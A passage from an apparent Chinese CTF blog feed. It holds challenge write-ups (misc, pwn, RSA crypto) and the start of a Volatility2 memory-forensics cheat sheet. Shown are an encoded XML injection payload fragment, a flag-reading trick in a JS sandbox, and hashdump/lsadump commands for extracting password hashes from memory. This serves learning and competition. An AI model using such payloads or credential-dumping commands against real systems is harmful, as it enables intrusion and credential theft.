00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00n%00%00%00a%00%00%00m%00%00%00e%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00+%00%00%00%3C%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00r%00%00%00o%00%00%00o%00%00%00t%00%00%00%3C%00%00%00%2F%00%00%00p%00%00%00a%00%00%00s%00%00%00s%00%00%00w%00%00%00o%00%00%00r%00%00%00d%00%00%00%3E%00%00%00%0D%00%00%00%0A%00%00%00%3C%00%00%00%2F%00%00%00u%00%00%00s%00%00%00e%00%00%00r%00%00%00%3E%00%00%00</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-8.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Welcome-to-QGB"><a href="#Welcome-to-QGB" class="headerlink" title="Welcome_to_QGB"></a>Welcome_to_QGB</h2><p><code>V2VsY29tZV90b19RR0I=</code>base64解码得到<code>Welcome_to_QGB</code></p><h2 id="找找GIF"><a href="#找找GIF" class="headerlink" title="找找GIF"></a>找找GIF</h2><p>伪加密，09-&gt;00，取出aaa</p><p>aaa添加后缀png，修改高度，得到压缩包密码：<code>okv90D%&amp;ffgbd</code></p><p>解压得到bbb，添加gif头<code>GIF89a</code>，得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%89%BE%E6%89%BEGIF.png"></p><h2 id="大佬大佬"><a href="#大佬大佬" class="headerlink" title="大佬大佬"></a>大佬大佬</h2><p>lsb提取出png</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%A4%A7%E4%BD%AC%E5%A4%A7%E4%BD%AC-1.png"></p><p>修改高度得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%A4%A7%E4%BD%AC%E5%A4%A7%E4%BD%AC-2.png"></p><h2 id="The-fun-picture"><a href="#The-fun-picture" class="headerlink" title="The fun picture"></a>The fun picture</h2><p>爆破得到密码<code>gh89</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/The%20fun%20picture-1.png"></p><p>FUN添加后缀zip，解压后文件补上png头<code>89 50 4e 47</code>,得到二维码</p><p>扫码得到<code>ZmxhZ3tycjkwZm5uZW1kZnUwOGdma2ttdmVtZGszZm12NmZnYX0=</code></p><p>base64解码得到flag</p><h2 id="B-tCh"><a href="#B-tCh" class="headerlink" title="B@tCh"></a>B@tCh</h2><p><em>赛后复现</em></p><p><code>BatchEncryption</code>混淆的批处理文件</p><p>特征一般是开头的两个字节为<code>0xFF</code>、<code>0xFE</code>，存在类似<code>BatchEncryption Build 201610 By gwsbhqt@163.com</code>的作者信息</p><p>本题将作者信息去除了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-1.png"></p><p>解密脚本，来自<a href="https://blog.csdn.net/Hunter98234/article/details/108672926">https://blog.csdn.net/Hunter98234/article/details/108672926</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Batch Decryption 202009 (BatchEncryption Build 201610)</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (data[<span class="hljs-number">0</span>] == <span class="hljs-number">0xFF</span> <span class="hljs-keyword">and</span> data[<span class="hljs-number">1</span>] == <span class="hljs-number">0xFE</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption bom error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>:<span class="hljs-number">9</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) != <span class="hljs-string">&#x27; &amp;cls\r\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption cls error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(data[<span class="hljs-number">9</span>:<span class="hljs-number">60</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) != <span class="hljs-string">&#x27;::BatchEncryption Build 201610 By gwsbhqt@163.com\r\n&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption build error!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">vars</span> = &#123;&#125;<br><br>    <span class="hljs-comment"># decryption line</span><br>    i = <span class="hljs-number">60</span><br>    l = <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">while</span> i &lt; l:<br>        i = run(<span class="hljs-built_in">vars</span>, data, i)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"><span class="hljs-built_in">vars</span>, data, i</span>):<br>    buf = <span class="hljs-string">&#x27;&#x27;</span><br>    f = <span class="hljs-number">0</span><br>    t = <span class="hljs-number">0</span><br>    x = <span class="hljs-literal">False</span><br>    l = <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-number">0x0d</span> <span class="hljs-keyword">and</span> data[i+<span class="hljs-number">1</span>] == <span class="hljs-number">0x0a</span>:<br>            i += <span class="hljs-number">2</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># get %var:~x,y% %0</span><br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-number">0x25</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:<br>                x = <span class="hljs-literal">True</span><br>                f = i<br>            <span class="hljs-keyword">else</span>:<br>                x = <span class="hljs-literal">False</span><br>                t = i<br>                rst = var_percent(data[f:t+<span class="hljs-number">1</span>], <span class="hljs-built_in">vars</span>)<br>                buf += rst<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x:<br>                buf += <span class="hljs-built_in">str</span>(data[i:i+<span class="hljs-number">1</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> (f + <span class="hljs-number">1</span> == i) <span class="hljs-keyword">and</span> ((data[i] &gt;= <span class="hljs-number">0x30</span> <span class="hljs-keyword">and</span> data[i] &lt;= <span class="hljs-number">0x39</span>) <span class="hljs-keyword">or</span> data[i] == <span class="hljs-number">0x2a</span>):<br>                    x = <span class="hljs-literal">False</span><br>                    t = i<br>                    rst = <span class="hljs-built_in">str</span>(data[f:t+<span class="hljs-number">1</span>], encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                    buf += rst<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i &gt;= l:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-built_in">print</span>(buf)<br>    bufs = buf.split(<span class="hljs-string">&#x27;&amp;@&#x27;</span>)<br>    <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> bufs:<br>        <span class="hljs-keyword">if</span> var[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;set &#x27;</span>:<br>            var = var[<span class="hljs-number">4</span>:]<br>            b = var.find(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-built_in">vars</span>[var[<span class="hljs-number">0</span>:b]] = var[b+<span class="hljs-number">1</span>:].replace(<span class="hljs-string">&#x27;^^^&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> i<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">var_percent</span>(<span class="hljs-params">data, <span class="hljs-built_in">vars</span></span>):<br>    full = <span class="hljs-built_in">str</span>(data, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    buf = full[<span class="hljs-number">1</span>:<span class="hljs-built_in">len</span>(full)-<span class="hljs-number">1</span>]<br>    buf = buf.split(<span class="hljs-string">&#x27;:~&#x27;</span>)<br>    var = buf[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> var <span class="hljs-keyword">in</span> <span class="hljs-built_in">vars</span>:<br>        <span class="hljs-built_in">vars</span>[var] = os.getenv(var)<br>    ent = <span class="hljs-built_in">vars</span>[var]<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(buf) &gt; <span class="hljs-number">1</span>):<br>        l = <span class="hljs-built_in">len</span>(ent)<br>        buf = buf[<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        f = <span class="hljs-built_in">int</span>(buf[<span class="hljs-number">0</span>])<br>        t = <span class="hljs-built_in">int</span>(buf[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">if</span> f &lt; <span class="hljs-number">0</span>:<br>            f, t = l + f, t<br>        rst = ent[f: f+t]<br>    <span class="hljs-keyword">else</span>:<br>        rst = full<br>    <span class="hljs-keyword">return</span> rst<br><br><br>encrypt_file = <span class="hljs-string">&#x27;./batch_decryption/Encrypted_01.txt&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    <span class="hljs-keyword">try</span>:<br>        file = <span class="hljs-built_in">open</span>(encrypt_file, <span class="hljs-string">&quot;rb&quot;</span>)<br>        data = file.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Batch decryption read error:&#x27;</span>, err)<br>        exit<br>    <span class="hljs-keyword">else</span>:<br>        file.close()<br><br>    decryption(data)<br></code></pre></td></tr></table></figure><p>修改下脚本，使它能适用于本题</p><p>因为附件中没有<code>Build 201610 By....</code>这串信息，所以将个判断去掉（17-19）<br>没有这个字符串后，bat内容也会从相应的60变为9（从@开始）</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-2.png"></p><p>95行改为文件名</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-3.png"></p><p>运行解密得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-B@tCh-4.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="qqjs-new"><a href="#qqjs-new" class="headerlink" title="qqjs_new"></a>qqjs_new</h2><p><em>非预期解</em></p><p>ida分析，看到<code>import * as std from &#39;std&#39;</code>和<code>import * as os from &#39;os&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-1.png"></p><p>所以输入<code>os</code>会返回模块中的函数<br>发现存在<code>readdir</code>，可以读目录</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-2.png"></p><p>找到flag文件位置<code>/home/ctf/flag</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-3.png"></p><p><code>std</code>模块中存在<code>loadFile</code>函数，可以读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-4.png"></p><p>读flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qqjs_new-5.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p><em>赛后复现</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> next_prime<br><span class="hljs-keyword">import</span> hashlib<br><br><br><br>p=<span class="hljs-number">165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977</span><br>q=<span class="hljs-number">120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731</span><br>e=<span class="hljs-number">33</span><br>c=<span class="hljs-number">10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919</span><br><br><br>n = p*q<br><br>d = gmpy2.invert(<span class="hljs-number">11</span>, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>c3 = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(c3)<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    m, flag = gmpy2.iroot(c3, <span class="hljs-number">3</span>)<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(m))<br>        exit()<br>    c3 = c3 + n<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Rank: 10，（东部赛区太卷了吧）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="强国杯" scheme="https://www.lewiserii.top/tags/%E5%BC%BA%E5%9B%BD%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>misc总结(取证篇)</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E5%8F%96%E8%AF%81%E7%AF%87).html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E5%8F%96%E8%AF%81%E7%AF%87).html</id>
    <published>2022-07-04T04:00:00.000Z</published>
    <updated>2023-04-20T08:18:34.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内存取证工具"><a href="#内存取证工具" class="headerlink" title="内存取证工具"></a>内存取证工具</h1><h2 id="Volatility2"><a href="#Volatility2" class="headerlink" title="Volatility2"></a>Volatility2</h2><blockquote><p>Volatility2是一款开源的，基于Python开发的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Windows、Linux、Mac、Android操作系统的RAM数据进行提取与分析。</p></blockquote><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs text"># 查看imagerinfo获取操作系统类型<br>volatility -f &lt;filename&gt; imageinfo<br><br># 指定操作系统类型进行其他操作<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt;<br><br># 查看进程<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; pslist<br><br># 查看文件<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;<br><br># 桌面<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; filescan | grep -E &quot;Desktop&quot;<br><br># 导出文件<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; dumpfiles -Q &lt;virtual address&gt; -D &lt;savedir&gt;<br><br># 获取系统用户名<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; printkey -K &quot;SAM\Domains\Account\Users\Names&quot;<br><br># 查看注册表<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hivelist<br><br># 提取用户密码<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; hashdump -y &lt;注册表 system 的 virtual 地址&gt; -s &lt;SAM 的 virtual 地址&gt;<br><br># 获取IE浏览器历史记录<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; iehistory<br><br># 查看网络连接<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; netscan<br><br># 将内存中的某个进程数据以 dmp 的格式保存出来<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; memdump -p &lt;pid&gt; -D &lt;savedir&gt;<br><br># 查看命令行历史记录<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdscan<br><br># 查看进程命令行参数<br>volatility -f &lt;filename&gt; --profile &lt;ostype&gt; cmdline<br></code></pre></td></tr></table></figure><h3 id="支持的插件列表"><a href="#支持的插件列表" class="headerlink" title="支持的插件列表"></a>支持的插件列表</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs text">amcache             # 查看 AmCache 应用程序痕迹信息<br>apihooks            # 检测内核及进程的内存空间中的 API hook<br>atoms               # 列出会话及窗口站 atom 表<br>atomscan            # Atom 表的池扫描(Pool scanner)<br>auditpol            # 列出注册表 HKLM\SECURITY\Policy\PolAdtEv 的审计策略信息<br>bigpools            # 使用 BigPagePoolScanner 转储大分页池(big page pools)<br>bioskbd             # 从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出 BIOS 开机密码)<br>cachedump           # 获取内存中缓存的域帐号的密码哈希<br>callbacks           # 打印全系统通知例程<br>clipboard           # 提取 Windows 剪贴板中的内容<br>cmdline             # 显示进程命令行参数<br>cmdscan             # 提取执行的命令行历史记录（扫描_COMMAND_HISTORY 信息）<br>connections         # 打印系统打开的网络连接(仅支持 Windows XP 和 2003)<br>connscan            # 打印 TCP 连接信息<br>consoles            # 提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION 信息）<br>crashinfo           # 提取崩溃转储信息<br>deskscan            # tagDESKTOP 池扫描(Poolscaner)<br>devicetree          # 显示设备树信息<br>dlldump             # 从进程地址空间转储动态链接库<br>dlllist             # 打印每个进程加载的动态链接库列表<br>driverirp           # IRP hook 驱动检测<br>drivermodule        # 关联驱动对象至内核模块<br>driverscan          # 驱动对象池扫描<br>dumpcerts           # 提取 RAS 私钥及 SSL 公钥<br>dumpfiles           # 提取内存中映射或缓存的文件<br>dumpregistry        # 转储内存中注册表信息至磁盘<br>editbox             # 查看 Edit 编辑控件信息 (Listbox 正在实验中)<br>envars              # 显示进程的环境变量<br>eventhooks          # 打印 Windows 事件 hook 详细信息<br>evtlogs             # 提取 Windows 事件日志(仅支持 XP/2003)<br>filescan            # 提取文件对象（file objects）池信息<br>gahti               # 转储用户句柄（handle）类型信息<br>gditimers           # 打印已安装的 GDI 计时器 (timers) 及回调(callbacks)<br>gdt                 # 显示全局描述符表(Global Descriptor Table)<br>getservicesids      # 获取注册表中的服务名称并返回 SID 信息<br>getsids             # 打印每个进程的 SID 信息<br>handles             # 打印每个进程打开的句柄的列表<br>hashdump            # 转储内存中的 Windows 帐户密码哈希(LM/NTLM)<br>hibinfo             # 转储休眠文件信息<br>hivedump            # 打印注册表配置单元信息<br>hivelist            # 打印注册表配置单元列表<br>hivescan            # 注册表配置单元池扫描<br>hpakextract         # 从 HPAK 文件（Fast Dump 格式）提取物理内存数据<br>hpakinfo            # 查看 HPAK 文件属性及相关信息<br>idt                 # 显示中断描述符表(Interrupt Descriptor Table)<br>iehistory           # 重建 IE 缓存及访问历史记录<br>imagecopy           # 将物理地址空间导出原生 DD 镜像文件<br>imageinfo           # 查看 / 识别镜像信息<br>impscan             # 扫描对导入函数的调用<br>joblinks            # 打印进程任务链接信息<br>kdbgscan            # 搜索和转储潜在 KDBG 值<br>kpcrscan            # 搜索和转储潜在 KPCR 值<br>ldrmodules          # 检测未链接的动态链接 DLL<br>lsadump             # 从注册表中提取 LSA 密钥信息（已解密）<br>machoinfo           # 转储 Mach-O 文件格式信息<br>malfind             # 查找隐藏的和插入的代码<br>mbrparser           # 扫描并解析潜在的主引导记录(MBR)<br>memdump             # 转储进程的可寻址内存<br>memmap              # 打印内存映射<br>messagehooks        # 桌面和窗口消息钩子的线程列表<br>mftparser           # 扫描并解析潜在的 MFT 条目<br>moddump             # 转储内核驱动程序到可执行文件的示例<br>modscan             # 内核模块池扫描<br>modules             # 打印加载模块的列表<br>multiscan           # 批量扫描各种对象<br>mutantscan          # 对互斥对象池扫描<br>notepad             # 查看记事本当前显示的文本<br>objtypescan         # 扫描窗口对象类型对象<br>patcher             # 基于页面扫描的补丁程序内存<br>poolpeek            # 可配置的池扫描器插件<br>printkey            # 打印注册表项及其子项和值<br>privs               # 显示进程权限<br>procdump            # 进程转储到一个可执行文件示例<br>pslist              # 按照 EPROCESS 列表打印所有正在运行的进程<br>psscan              # 进程对象池扫描<br>pstree              # 以树型方式打印进程列表<br>psxview             # 查找带有隐藏进程的所有进程列表<br>qemuinfo            # 转储 Qemu 信息<br>raw2dmp             # 将物理内存原生数据转换为 windbg 崩溃转储格式<br>screenshot          # 基于 GDI Windows 的虚拟屏幕截图保存<br>servicediff         # Windows 服务列表(ala Plugx)<br>sessions            # _MM_SESSION_SPACE 的详细信息列表(用户登录会话)<br>shellbags           # 打印 Shellbags 信息<br>shimcache           # 解析应用程序兼容性 Shim 缓存注册表项<br>shutdowntime        # 从内存中的注册表信息获取机器关机时间<br>sockets             # 打印已打开套接字列表<br>sockscan            # TCP 套接字对象池扫描<br>ssdt                # 显示 SSDT 条目<br>strings             # 物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)<br>svcscan             # windows 服务列表扫描<br>symlinkscan         # 符号链接对象池扫描<br>thrdscan            # 线程对象池扫描<br>threads             # 调查_ETHREAD 和_KTHREADs<br>timeliner           # 创建内存中的各种痕迹信息的时间线<br>timers              # 打印内核计时器及关联模块的 DPC<br>truecryptmaster     # 恢复 TrueCrypt 7.1a 主密钥<br>truecryptpassphrase # 查找并提取 TrueCrypt 密码<br>truecryptsummary    # TrueCrypt 摘要信息<br>unloadedmodules     # 